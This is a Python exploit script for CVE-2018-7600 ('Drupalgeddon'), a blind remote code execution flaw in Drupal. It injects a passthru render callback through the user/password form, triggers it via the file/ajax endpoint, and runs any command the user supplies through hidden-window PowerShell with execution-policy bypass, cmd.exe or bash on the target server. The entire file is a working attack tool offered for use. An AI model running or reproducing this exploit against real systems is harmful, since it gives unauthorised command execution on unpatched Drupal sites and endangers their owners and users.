#!/usr/bin/python3

# author: dugisan3rd

import sys
import argparse
import requests
import re

def exploit(rhost, rport, term):
    url = f"http://{rhost}:{rport}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={term}"
    data = {"form_id": "user_pass", "_triggering_element_name": "name"}
    r = requests.post(url, data=data, verify=False)
    print("[+] Injecting payload")
    form = re.search('<input type="hidden" name="form_build_id" value="(.*?)" />', r.text)
    if form is not None:
        form_build_id = form.group(1)
        data = {"form_build_id": form_build_id}
        url = f"http://{rhost}:{rport}/file/ajax/name/%23value/{form_build_id}"
        print("[+] Triggering payload")
        r = requests.post(url, data=data, verify=False)
    else:
        print("[+] 'form_build_id' is not found!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2018-7600: Drupal Blind RCE (drupalgeddon)")
    parser.add_argument("-r", "--rhost", help="Target IP")
    parser.add_argument("-p", "--rport", help="Target port", type=int, default=80)
    parser.add_argument("-x", "--command", help="Command to execute")
    parser.add_argument("-s", "--shell", help="[cmd|ps|bash]")
    args = parser.parse_args()
    rhost = args.rhost
    rport = args.rport
    command = args.command
    shell = args.shell
    if len(sys.argv) < 2:
        print('[+] Argument required! Please use -h for more details')
    else:
        if rhost and rport and command and shell is not None:
            if shell == "ps":
                term = f"C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {command}"
                exploit(rhost, rport, term)
            elif shell == "cmd":
                term = f"C:\Windows\System32\cmd.exe /c {command}"
                exploit(rhost, rport, term)
            elif shell == "bash":
                term = f"/bin/bash -c {command}"
                exploit(rhost, rport, term)
            else:
                print("[+] Use cmd for windows command prompt, ps for windows powershell or bash for linux")
                sys.exit()
            
        else:
            print("[+] Missing arguments!")
